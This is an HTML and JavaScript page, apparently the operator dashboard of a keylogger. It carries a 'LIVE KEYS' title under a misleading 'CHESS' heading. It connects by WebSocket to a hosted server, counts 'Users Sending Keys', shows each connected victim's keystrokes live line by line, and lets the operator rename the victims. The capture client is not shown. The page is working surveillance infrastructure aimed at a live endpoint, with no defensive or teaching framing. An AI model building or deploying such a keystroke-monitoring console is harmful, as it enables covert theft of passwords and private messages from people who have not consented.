<!DOCTYPE html>
<html lang="en">
<head>
    <title>LIVE KEYS</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #1B1C1D;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            padding: 50px 15px;
            box-sizing: border-box;
        }
        h1 {
            color: #0000FF;
            font-size: 50px;
            margin: 0;
        }
        #status-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 8px;
            margin-bottom: 10px;
            color: #FFFFFF;
            height: 36px;
        }
        .rectangle {
            width: 1000px;
            max-width: 95%;
            height: 500px;
            background-color: transparent;
            border: 3px solid white;
            border-radius: 25px;
            margin-top: 20px;
            padding: 15px;
            overflow-y: auto;
            box-sizing: border-box;
        }
        .rectangle p {
            color: white;
            margin: 5px 0;
            font-size: 16px;
            word-wrap: break-word;
        }
        #plus-btn {
            display: none;
            margin-left: 10px;
            padding: 5px 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            border: 1px solid white;
            background-color: #333;
            color: white;
            line-height: 1;
        }
        #other-users-container {
            display: none;
            margin-top: 15px;
            border-top: 1px solid #555;
            padding-top: 15px;
            width: 90%;
            max-width: 500px;
        }
        #other-users-list {
            list-style: none;
            padding: 0;
            margin: 0;
            color: white;
        }
        #other-users-list li {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            padding: 8px;
            background-color: #2a2c2d;
            border-radius: 5px;
        }
        #other-users-list li button, .rename-btn {
            margin-left: 15px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <h1>CHESS</h1>
    
    <div id="status-container"></div>
    
    <div id="other-users-container">
        <ul id="other-users-list"></ul>
    </div>

    <div id="message-box" class="rectangle"></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Use ws:// for local testing, wss:// for production
            const ws = new WebSocket("wss://NZE77-coke.hf.space/ws"); 

            const statusContainer = document.getElementById('status-container');
            const messageBox = document.getElementById('message-box');
            const otherUsersContainer = document.getElementById('other-users-container');
            const otherUsersListEl = document.getElementById('other-users-list');

            let activeUsers = [];
            let currentLineElement = null;

            function createRenameButton(user) {
                const renameBtn = document.createElement('button');
                renameBtn.textContent = 'Rename';
                renameBtn.className = 'rename-btn';
                renameBtn.onclick = () => {
                    const newName = prompt(`Enter new name for "${user.name}":`, user.name);
                    if (newName && newName.trim() !== '') {
                        ws.send(JSON.stringify({
                            type: 'rename_request',
                            id: user.id,
                            newName: newName.trim()
                        }));
                    }
                };
                return renameBtn;
            }

            function renderUserList() {
                statusContainer.innerHTML = '';
                otherUsersListEl.innerHTML = '';
                otherUsersContainer.style.display = 'none';

                if (activeUsers.length === 0) {
                    statusContainer.textContent = '0 Users Sending Keys';
                    // Hide plus button if it exists
                    const plusBtn = statusContainer.querySelector('#plus-btn');
                    if(plusBtn) plusBtn.style.display = 'none';

                } else if (activeUsers.length === 1) {
                    const singleUser = activeUsers[0];
                    const nameSpan = document.createElement('span');
                    nameSpan.textContent = `${singleUser.name} connected`;
                    statusContainer.appendChild(nameSpan);
                    statusContainer.appendChild(createRenameButton(singleUser));

                } else { // 2 or more users
                    const firstUser = activeUsers[0];
                    const otherUsers = activeUsers.slice(1);
                    const nameSpan = document.createElement('span');
                    nameSpan.textContent = `${firstUser.name} connected`;
                    statusContainer.appendChild(nameSpan);
                    statusContainer.appendChild(createRenameButton(firstUser));

                    const plusBtn = document.createElement('button');
                    plusBtn.id = 'plus-btn';
                    plusBtn.textContent = `+${otherUsers.length}`;
                    plusBtn.onclick = () => {
                        const isHidden = otherUsersContainer.style.display === 'none';
                        otherUsersContainer.style.display = isHidden ? 'block' : 'none';
                    };
                    statusContainer.appendChild(plusBtn);

                    otherUsers.forEach(user => {
                        const li = document.createElement('li');
                        const nameSpan = document.createElement('span');
                        nameSpan.textContent = user.name;
                        li.appendChild(nameSpan);
                        li.appendChild(createRenameButton(user));
                        otherUsersListEl.appendChild(li);
                    });
                }
            }

            function handleKeyPress(data) {
                if (data.includes("[ENTER]")) {
                    currentLineElement = null;
                    return;
                }
                if (currentLineElement === null) {
                    currentLineElement = document.createElement('p');
                    messageBox.prepend(currentLineElement);
                }
                currentLineElement.textContent += data;
            }

            ws.onopen = () => {
                statusContainer.textContent = "Connecting...";
                ws.send(JSON.stringify({ type: "identify_viewer" }));
            };

            ws.onmessage = (event) => {
                const message = JSON.parse(event.data);
                
                // --- DEBUGGING LINE ---
                // This will show every message received from the server in your browser's console.
                console.log("Received message from server:", message);
                // --- END DEBUGGING LINE ---

                switch (message.type) {
                    case 'user_list_update':
                        activeUsers = message.users;
                        renderUserList();
                        break;
                    case 'key_press':
                        handleKeyPress(message.data);
                        break;
                    default:
                        console.warn('Received unknown message type:', message.type);
                }
            };

            ws.onclose = () => {
                statusContainer.textContent = 'Disconnected. Refresh to reconnect.';
                statusContainer.style.color = '#E74C3C';
            };

            ws.onerror = (error) => {
                statusContainer.textContent = 'Connection Error.';
                statusContainer.style.color = '#E74C3C';
                console.error("WebSocket Error:", error);
            };
        });
    </script>

</body>

</html>

